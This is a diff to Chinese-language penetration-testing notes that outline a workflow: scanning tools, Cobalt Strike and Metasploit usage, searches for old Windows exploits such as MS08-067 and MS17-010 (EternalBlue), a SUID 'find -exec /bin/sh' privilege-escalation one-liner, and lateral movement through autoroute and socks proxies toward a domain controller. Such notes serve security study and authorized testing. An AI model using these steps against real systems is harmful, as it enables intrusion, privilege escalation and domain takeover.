@@ -15,16 +15,22 @@ Web漏洞分析
 
 ## 渗透流程
 1. 信息收集 > fscan/cscan, NMAP > AWVS > Appscan > Burpsuite > x-ray
+1.1 cs上线后联动msf, cs 插件 收集域信息
 2. msfconsole
-search ms10_018 (xp的)
-ms08-067 (445端口, 2008以外系统)
-search ms17_010 (永恒之蓝)
+```shell
+migrate
+search ms10_018 #(xp的)
+ms08_067 # (445端口, 2008以外系统, KB958644)
+search ms17_010 # (永恒之蓝)
+```
 3. Web:  kali - web程序 -  ZAP 扫描
 4. [linux suid find 提权](https://mp.weixin.qq.com/s/8rgvLbOmmjcxVZT7BoW5Og)
 ```shell
 find / -perm -4000 # 如果有find 执行下面
 find ./ aaa -exec '/bin/sh' \;
 ```
+5.横向移动
+msf: 1. autoroute 2.add socks proxy 3.域控
 
 ## MSF
 nmap 探测漏洞
